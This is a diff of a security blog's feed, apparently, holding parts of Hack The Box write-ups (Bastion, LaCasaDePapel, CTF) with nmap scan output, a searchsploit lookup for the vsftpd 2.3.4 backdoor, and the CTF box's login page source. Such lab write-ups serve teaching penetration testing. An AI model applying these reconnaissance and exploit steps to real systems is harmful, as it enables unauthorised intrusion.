 &lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="ssh" /><category term="smb" /><category term="windows-exploitation" /><summary type="html">Quick Summary Hey guys, this is my second post for Bastion, in the first post I solved it with kali, in this one I will solve it with CommandoVM. Bastion’s ip is 10.10.10.134, I added it to C:\Windows\System32\drivers\etc\hosts as bastion.htb. Let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : ``` C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;nmap -sV -sT -sC -o nmapinitial bastion.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 16:23 Egypt Standard Time Nmap scan report for bastion.htb (10.10.10.134) Host is up (0.49s latency). Other addresses for bastion.htb (not scanned): 10.10.10.134 Not shown: 996 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bastion-2/0.png" /></entry><entry><title type="html">Hack The Box - Bastion</title><link href="https://0xrick.github.io/hack-the-box/bastion/" rel="alternate" type="text/html" title="Hack The Box - Bastion" /><published>2019-09-07T00:00:00+02:00</published><updated>2019-09-07T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/bastion</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/bastion/">&lt;hr /&gt;
 
@@ -532,6 +803,7 @@ root@kali:~/Desktop/HTB/boxes/bastion#
 &lt;br /&gt;
 &lt;br /&gt;
 &lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/onetwoseven/&quot;&gt;Hack The Box - OneTwoSeven&lt;/a&gt;
+&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/luke/&quot;&gt;Hack The Box - Luke&lt;/a&gt;
 &lt;br /&gt;Second post : &lt;a href=&quot;/hack-the-box/bastion-2/&quot;&gt;Hack The Box - Bastion (Commando)&lt;/a&gt;&lt;/p&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="ssh" /><category term="smb" /><category term="windows-exploitation" /><summary type="html">Quick Summary Hey guys today Bastion retired and here’s my write-up about it. It was a nice easy box, unlike most of the other boxes this one had no web service running and unlike most of the Windows boxes it had ssh. I wrote two write-ups for this box, this one solving it with Linux (Kali), Second one solving it with Windows (CommandoVM). It’s a Windows box and its ip is 10.10.10.134, I added it to /etc/hosts as bastion.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` Nmap 7.70 scan initiated Fri Sep 6 14:12:10 2019 as: nmap -sV -sT -sC -o nmapinitial bastion.htb Nmap scan report for bastion.htb (10.10.10.134) Host is up (0.41s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bastion/0.png" /></entry><entry><title type="html">Hack The Box - OneTwoSeven</title><link href="https://0xrick.github.io/hack-the-box/onetwoseven/" rel="alternate" type="text/html" title="Hack The Box - OneTwoSeven" /><published>2019-08-31T00:00:00+02:00</published><updated>2019-08-31T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/onetwoseven</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/onetwoseven/">&lt;hr /&gt;
 
@@ -5681,590 +5953,4 @@ lacasadepapel [~]$
 &lt;br /&gt;
 &lt;br /&gt; Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ctf/&quot;&gt;Hack The Box - CTF&lt;/a&gt;
 &lt;br /&gt; Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/fortune/&quot;&gt;Hack The Box - Fortune&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="linux" /><category term="web" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is 10.10.10.131, I added it to /etc/hosts as lacasadepapel.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC lacasadepapel.htb We have http on port 80. https on port 443, ftp on port 21 and ssh on port 22. Anonymous authentication wasn’t allowed on ftp so I checked http and https : root@kali:~/Desktop/HTB/boxes/lacasadepapel# ftp lacasadepapel.htb Connected to lacasadepapel.htb. 220 (vsFTPd 2.3.4) Name (lacasadepapel.htb:root): anonymous 331 Please specify the password. Password: 530 Login incorrect. Login failed. ftp&amp;gt; HTTP http://lacasadepapel.htb We see an image of the characters from LaCasaDePapel (TV show) and a QR code for OTP, I scanned it with Google Authenticator on my phone : As you can see I had to refresh it manually while other tokens refreshed automatically, no idea why but anyway I took the OTP and used test@test.com as email : Then nothing happened, I just got the same page back again. I tried gobuster to see if I can find any sub directories and I didn’t get anything useful. Let’s check https. https://lacasadepapel.htb The same background with an error message saying : “Sorry, but you need to provide a client certificate to continue.” vsftpd 2.3.4, Psy Shell After hitting dead ends with web, I checked the ftp service again, the version was vsftpd 2.3.4 (from the nmap scan) so I searched for exploits : root@kali:~/Desktop/HTB/boxes/lacasadepapel# searchsploit vsftpd 2.3.4 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | exploits/unix/remote/17491.rb -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result Command Execution and there is a metasploit module for it, but the exploit didn’t work : ``` msf5 &amp;gt; search vsftpd 2.3.4</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/lacasadepapel/0.png" /></entry><entry><title type="html">Hack The Box - CTF</title><link href="https://0xrick.github.io/hack-the-box/ctf/" rel="alternate" type="text/html" title="Hack The Box - CTF" /><published>2019-07-20T00:00:00+02:00</published><updated>2019-07-20T00:00:00+02:00</updated><id>https://0xrick.github.io/hack-the-box/ctf</id><content type="html" xml:base="https://0xrick.github.io/hack-the-box/ctf/">&lt;hr /&gt;
-
-&lt;h2 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an &lt;code class=&quot;highlighter-rouge&quot;&gt;ldap&lt;/code&gt; injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.122&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;ctf.htb&lt;/code&gt;. Let’s jump right in !
-&lt;img src=&quot;/images/hackthebox/ctf/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;
-&lt;p&gt;&lt;br /&gt; As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC ctf.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/ctf/1.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; Only &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h2&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://ctf.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/ctf/2.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.
-&lt;img src=&quot;/images/hackthebox/ctf/3.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt; We need a username and an &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; (one-time password). An &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt; is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s or to be able to generate valid &lt;code class=&quot;highlighter-rouge&quot;&gt;OTP&lt;/code&gt;s ourselves. Let’s take a look at the source code of the login page, maybe something is there :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;viewport&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;author&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;icon&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/favicon.ico&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;CTF login form&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-
-    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Bootstrap core CSS --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/dist/css/bootstrap.min.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-
-    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Custom styles for this template --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cover.css&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cover-container d-flex w-100 h-100 p-3 mx-auto flex-column&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;header&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;masthead mb-auto&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inner&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-          &lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;masthead-brand&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;CTF&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
-          &lt;span class=&quot;nt&quot;&gt;&amp;lt;nav&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav nav-masthead justify-content-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link active&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-            &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nav-link active&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;login.php&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
-          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/nav&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-2 col-form-label&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsename&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputUsername&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-2 col-form-label&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;OTP&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inputOTP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;One Time Password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-sm-10&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn btn-primary  name=&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Login&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;      
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;footer&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mastfoot mt-auto text-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inner&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;CTF&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://www.hackthebox.eu/home/users/profile/13340&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;target=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_blank&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;0xEA31&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;. Cover template for &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://getbootstrap.com/&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Bootstrap&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;, by &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://twitter.com/mdo&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;@mdo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/footer&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
-
-    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Bootstrap core JavaScript
-    ================================================== --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Placed at the end of the document so the pages load faster --&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://code.jquery.com/jquery-3.3.1.slim.min.js&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;integrity=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;crossorigin=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;anonymous&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
